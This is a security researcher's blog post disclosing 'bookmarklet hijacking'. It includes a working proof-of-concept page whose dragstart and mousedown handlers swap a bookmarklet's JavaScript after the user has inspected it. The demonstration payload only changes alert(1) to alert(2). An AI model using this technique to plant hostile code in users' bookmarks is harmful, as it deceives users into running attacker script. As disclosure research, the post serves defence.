<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="/assets/css/style.css?v=">
    <link rel="icon" href="/assets/img/favicon.ico"/>
    <link rel="alternate" type="application/rss+xml" title="RSS Feed" href="/feed.xml" />

<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Bookmarklet hijacking | Kamil Vavra @vavkamil</title>
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="Bookmarklet hijacking" />
<meta name="author" content="vavkamil" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="I noticed an exciting link shared on Hacker News titled ‚ÄúWait, what‚Äôs a bookmarklet?‚Äù. I have been using them for a long time, and while reading that discussion, it was nice to see people sharing useful ones they use to make their everyday tasks easier." />
<meta property="og:description" content="I noticed an exciting link shared on Hacker News titled ‚ÄúWait, what‚Äôs a bookmarklet?‚Äù. I have been using them for a long time, and while reading that discussion, it was nice to see people sharing useful ones they use to make their everyday tasks easier." />
<link rel="canonical" href="http://localhost:4000/blog/2023-10-26-bookmarklet-hijacking/" />
<meta property="og:url" content="http://localhost:4000/blog/2023-10-26-bookmarklet-hijacking/" />
<meta property="og:site_name" content="Kamil Vavra @vavkamil" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-10-26T02:00:00+02:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Bookmarklet hijacking" />
<meta name="twitter:site" content="@vavkamil" />
<meta name="twitter:creator" content="@vavkamil" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"vavkamil"},"dateModified":"2023-10-26T02:00:00+02:00","datePublished":"2023-10-26T02:00:00+02:00","description":"I noticed an exciting link shared on Hacker News titled ‚ÄúWait, what‚Äôs a bookmarklet?‚Äù. I have been using them for a long time, and while reading that discussion, it was nice to see people sharing useful ones they use to make their everyday tasks easier.","headline":"Bookmarklet hijacking","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/blog/2023-10-26-bookmarklet-hijacking/"},"url":"http://localhost:4000/blog/2023-10-26-bookmarklet-hijacking/"}</script>
<!-- End Jekyll SEO tag -->

  </head>

  <body>

    <header>
      <div class="container">
        <a id="a-title" href="/">
          <h1>Kamil Vavra | @vavkamil</h1>
        </a>
        <h2>Offensive website security | Bug bounty | Ethical hacking</h2>

        <section id="downloads">
          <a href="/talks" class="btn"><span class="icon">üì¢</span>Talks</a>
          <a href="/whoami" class="btn"><span class="icon">üïµÔ∏è</span>Whoami</a>
          <a href="/bug-bounty" class="btn"><span class="icon">üí∞</span>Bug bounty</a>
          <a href="/blog" class="btn"><span class="icon">üìñ</span>Blog</a>
          <a href="https://github.com/vavkamil" target="_blank" class="btn"><span class="icon">üíª</span>GitHub</a>
          <a href="https://www.linkedin.com/in/vavkamil/" target="_blank" class="btn"><span class="icon">üèÜ</span>LinkedIn</a>
          <a href="/contact" class="btn"><span class="icon">üì©</span>Contact</a><br><br>
        </section>
      </div>
    </header>

    <div class="container">
      <section id="main_content">
        <small>26 October 2023</small>
<h1>Bookmarklet hijacking</h1>

<p class="view">by vavkamil</p>

<div>



  <p>5 minutes to read</p>

</div>

<p>I noticed an exciting link shared on Hacker News titled ‚Äú<a href="https://news.ycombinator.com/item?id=38014069">Wait, what‚Äôs a bookmarklet?</a>‚Äù. I have been using them for a long time, and while reading that discussion, it was nice to see people sharing useful ones they use to make their everyday tasks easier.</p>

<p>The security engineering mind got me thinking about the security implications of saving bookmarks with JavaScript from other websites, especially when readers share links to the GitHub gists.</p>

<p>We already know executing any non-trusted JavaScript is a wrong move. People were being tricked into pasting stuff into the browser console on popular websites and got hacked that way. There were even massive phishing campaigns using malicious <a href="https://breakdev.org/hacked-discord-bookmarklet-attacks/">bookmarklets against Discord users</a>.</p>

<p>But what if the victim is cautious and examines the content of bookmarklet JS before saving them to bookmarks? People often hover over links to see if they lead to malicious sites.</p>

<p>So, I was thinking about changing the content before the user saved it to bookmarks and was experimenting with the ondragstart Event. I came up with a very simple Proof of Concept for Chromium-based browsers and Firefox - <a href="https://gist.github.com/vavkamil/0b167814cabf8787cd4c4ab629614c6e">https://gist.github.com/vavkamil/0b167814cabf8787cd4c4ab629614c6e</a>.</p>

<p>It‚Äôs a simple PoC where the href attribute specifies the link‚Äôs destination:</p>

<p><code class="language-plaintext highlighter-rouge">javascript: (() =&gt; { alert(1); })();</code></p>

<p>And after saving to bookmarks, it changes to:</p>

<p><code class="language-plaintext highlighter-rouge">javascript: (() =&gt; { alert(2); })();</code></p>

<p>You can see it here: <a href="https://xss.vavkamil.cz/bookmarklet.html">https://xss.vavkamil.cz/bookmarklet.html</a></p>

<h3 id="chromium-version-1180599388">Chromium Version 118.0.5993.88</h3>

<video src="/assets/img/2023/10/bookmarklets_chromium.webm"></video>

<h3 id="mozilla-firefox-1190">Mozilla Firefox 119.0</h3>

<video src="/assets/img/2023/10/bookmarklets_firefox.webm"></video>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">html</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">head</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="nx">title</span><span class="o">&gt;</span><span class="nx">Bookmarklet</span> <span class="nx">hijacking</span> <span class="nx">PoC</span><span class="o">&lt;</span><span class="sr">/title</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/head</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="nx">body</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="nx">h1</span><span class="o">&gt;</span><span class="nx">Bookmarklet</span> <span class="nx">hijacking</span><span class="o">&lt;</span><span class="sr">/h1</span><span class="err">&gt;
</span>    <span class="o">&lt;</span><span class="nx">h2</span><span class="o">&gt;</span><span class="nx">Chromium</span> <span class="nx">Proof</span> <span class="k">of</span> <span class="nx">Concept</span><span class="o">&lt;</span><span class="sr">/h2</span><span class="err">&gt;
</span>
    <span class="o">&lt;</span><span class="nx">h3</span><span class="o">&gt;</span><span class="nx">Steps</span> <span class="nx">to</span> <span class="nx">reproduce</span><span class="o">&lt;</span><span class="sr">/h3</span><span class="err">&gt;
</span>    <span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">.</span> <span class="o">&lt;</span><span class="nx">strong</span><span class="o">&gt;</span><span class="nx">Double</span><span class="o">-</span><span class="nx">check</span> <span class="nx">that</span> <span class="nx">the</span> <span class="nx">link</span> <span class="nx">executes</span><span class="o">&lt;</span><span class="sr">/strong&gt; &lt;code&gt;alert</span><span class="se">(</span><span class="sr">1</span><span class="se">)</span><span class="sr">&lt;/</span><span class="nx">code</span><span class="o">&gt;&lt;</span><span class="sr">/p</span><span class="err">&gt;
</span>    <span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="mi">2</span><span class="p">.</span> <span class="o">&lt;</span><span class="nx">strong</span><span class="o">&gt;</span><span class="nx">Drag</span> <span class="o">&amp;</span> <span class="nx">drop</span> <span class="nx">the</span> <span class="nx">link</span> <span class="nx">to</span> <span class="nc">Bookmarks </span><span class="p">(</span><span class="nx">tool</span><span class="p">)</span><span class="nx">bar</span><span class="o">&lt;</span><span class="sr">/strong&gt;&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="mi">3</span><span class="p">.</span> <span class="o">&lt;</span><span class="nx">strong</span><span class="o">&gt;</span><span class="nx">Double</span><span class="o">-</span><span class="nx">check</span> <span class="nx">that</span> <span class="nx">the</span> <span class="nx">link</span> <span class="nx">executes</span><span class="o">&lt;</span><span class="sr">/strong&gt; &lt;code&gt;alert</span><span class="se">(</span><span class="sr">1</span><span class="se">)</span><span class="sr">&lt;/</span><span class="nx">code</span><span class="o">&gt;&lt;</span><span class="sr">/p</span><span class="err">&gt;
</span>    <span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="mi">4</span><span class="p">.</span> <span class="o">&lt;</span><span class="nx">strong</span><span class="o">&gt;</span><span class="nx">Click</span> <span class="nx">the</span> <span class="nx">link</span> <span class="k">in</span> <span class="nx">Bookmarks</span><span class="p">;</span> <span class="nx">it</span> <span class="nx">executes</span><span class="o">&lt;</span><span class="sr">/strong&gt; &lt;code&gt;alert</span><span class="se">(</span><span class="sr">2</span><span class="se">)</span><span class="sr">&lt;/</span><span class="nx">code</span><span class="o">&gt;&lt;</span><span class="sr">/p</span><span class="err">&gt;
</span>    <span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="dl">"</span><span class="s2">javascript: (() =&gt; { alert(1); })();</span><span class="dl">"</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">myLink</span><span class="dl">"</span> <span class="nx">draggable</span><span class="o">=</span><span class="dl">"</span><span class="s2">true</span><span class="dl">"</span><span class="o">&gt;</span><span class="nx">Save</span> <span class="k">this</span> <span class="nx">cool</span> <span class="nx">bookmarklet</span><span class="o">!&lt;</span><span class="sr">/a</span><span class="err">&gt;
</span>
    <span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
        <span class="kd">const</span> <span class="nx">linkElement</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">myLink</span><span class="dl">'</span><span class="p">);</span>
        <span class="kd">const</span> <span class="nx">originalLink</span> <span class="o">=</span> <span class="nx">linkElement</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>

        <span class="nx">linkElement</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">dragstart</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
            <span class="kd">const</span> <span class="nx">newLink</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">javascript: (() =&gt; { alert(2); })();</span><span class="dl">"</span><span class="p">;</span>
            <span class="nx">event</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="nx">newLink</span><span class="p">;</span>

            <span class="c1">// Set the data for the drag event to the new link</span>
            <span class="nx">event</span><span class="p">.</span><span class="nx">dataTransfer</span><span class="p">.</span><span class="nf">setData</span><span class="p">(</span><span class="dl">'</span><span class="s1">text/uri-list</span><span class="dl">'</span><span class="p">,</span> <span class="nx">newLink</span><span class="p">);</span>
            <span class="nx">event</span><span class="p">.</span><span class="nx">dataTransfer</span><span class="p">.</span><span class="nf">setData</span><span class="p">(</span><span class="dl">'</span><span class="s1">text/plain</span><span class="dl">'</span><span class="p">,</span> <span class="nx">newLink</span><span class="p">);</span>

            <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Link location changed to:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">event</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">href</span><span class="p">);</span>
        <span class="p">});</span>

        <span class="nx">linkElement</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">dragend</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
            <span class="c1">// Reset the link back to its original value after the drag operation has ended</span>
            <span class="nx">event</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="nx">originalLink</span><span class="p">;</span>
            <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Link location reset to:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">event</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">href</span><span class="p">);</span>
        <span class="p">});</span>
    <span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span>
    <span class="o">&lt;</span><span class="nx">hr</span><span class="o">&gt;</span>

    <span class="o">&lt;</span><span class="nx">h2</span><span class="o">&gt;</span><span class="nx">Firefox</span> <span class="nx">Proof</span> <span class="k">of</span> <span class="nx">Concept</span><span class="o">&lt;</span><span class="sr">/h2</span><span class="err">&gt;
</span>
    <span class="o">&lt;</span><span class="nx">h3</span><span class="o">&gt;</span><span class="nx">Steps</span> <span class="nx">to</span> <span class="nx">reproduce</span><span class="o">&lt;</span><span class="sr">/h3</span><span class="err">&gt;
</span>    <span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">.</span> <span class="o">&lt;</span><span class="nx">strong</span><span class="o">&gt;</span><span class="nx">Double</span><span class="o">-</span><span class="nx">check</span> <span class="nx">that</span> <span class="nx">the</span> <span class="nx">link</span> <span class="nx">executes</span><span class="o">&lt;</span><span class="sr">/strong&gt; &lt;code&gt;alert</span><span class="se">(</span><span class="sr">1</span><span class="se">)</span><span class="sr">&lt;/</span><span class="nx">code</span><span class="o">&gt;&lt;</span><span class="sr">/p</span><span class="err">&gt;
</span>    <span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="mi">2</span><span class="p">.</span> <span class="o">&lt;</span><span class="nx">strong</span><span class="o">&gt;</span><span class="nx">Right</span><span class="o">-</span><span class="nx">click</span> <span class="o">&amp;</span> <span class="nx">Bookmark</span> <span class="nx">link</span><span class="p">...</span> <span class="o">&amp;</span> <span class="nx">Save</span><span class="o">&lt;</span><span class="sr">/strong&gt;&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="mi">3</span><span class="p">.</span> <span class="o">&lt;</span><span class="nx">strong</span><span class="o">&gt;</span><span class="nx">Double</span><span class="o">-</span><span class="nx">check</span> <span class="nx">that</span> <span class="nx">the</span> <span class="nx">link</span> <span class="nx">executes</span><span class="o">&lt;</span><span class="sr">/strong&gt; &lt;code&gt;alert</span><span class="se">(</span><span class="sr">1</span><span class="se">)</span><span class="sr">&lt;/</span><span class="nx">code</span><span class="o">&gt;&lt;</span><span class="sr">/p</span><span class="err">&gt;
</span>    <span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="mi">4</span><span class="p">.</span> <span class="o">&lt;</span><span class="nx">strong</span><span class="o">&gt;</span><span class="nx">Click</span> <span class="nx">the</span> <span class="nx">link</span> <span class="k">in</span> <span class="nx">Bookmarks</span><span class="p">;</span> <span class="nx">it</span> <span class="nx">executes</span><span class="o">&lt;</span><span class="sr">/strong&gt; &lt;code&gt;alert</span><span class="se">(</span><span class="sr">2</span><span class="se">)</span><span class="sr">&lt;/</span><span class="nx">code</span><span class="o">&gt;&lt;</span><span class="sr">/p</span><span class="err">&gt;
</span>    <span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="dl">"</span><span class="s2">javascript: (() =&gt; { alert(1); })();</span><span class="dl">"</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">myLink_2</span><span class="dl">"</span><span class="o">&gt;</span><span class="nx">Save</span> <span class="k">this</span> <span class="nx">cool</span> <span class="nx">bookmarklet</span><span class="o">!&lt;</span><span class="sr">/a</span><span class="err">&gt;
</span>
    <span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
        <span class="kd">const</span> <span class="nx">linkElement_2</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">myLink_2</span><span class="dl">'</span><span class="p">);</span>
        <span class="kd">const</span> <span class="nx">originalLink_2</span> <span class="o">=</span> <span class="nx">linkElement_2</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>

        <span class="nx">linkElement_2</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">mousedown</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
            <span class="kd">const</span> <span class="nx">newLink</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">javascript: (() =&gt; { alert(2); })();</span><span class="dl">"</span><span class="p">;</span>
            <span class="nx">event</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="nx">newLink</span><span class="p">;</span>

            <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Link location changed to:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">event</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">href</span><span class="p">);</span>
        <span class="p">});</span>

        <span class="nx">linkElement_2</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">mouseover</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
            <span class="c1">// Reset the link back to its original value after the drag operation has ended</span>
            <span class="nx">event</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="nx">originalLink</span><span class="p">;</span>
            <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Link location reset to:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">event</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">href</span><span class="p">);</span>
        <span class="p">});</span>
    <span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/body</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/html</span><span class="err">&gt;
</span></code></pre></div></div>



  <small>tags: <em>xss</em> - <em>javascript</em> - <em>bookmarklet</em> - <em>hijacking</em></small>



      </section>
    </div>

    <hr>
    
    
    Content on this site is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a><br />
    &#127279; 2019&dash;2026 - <strong>@vavkamil</strong> - <a href="https://github.com/vavkamil/vavkamil.cz" target="_blank">Open-source</a> Github pages - Powered by <a href="https://jekyllrb.com" target="_blank">Jekyll</a> &amp; <a href="https://github.com/pages-themes/hacker" target="_blank">The Hacker theme</a> - Subscribe via <a href="http://localhost:4000/feed.xml">RSS</a>
  </body>
</html>
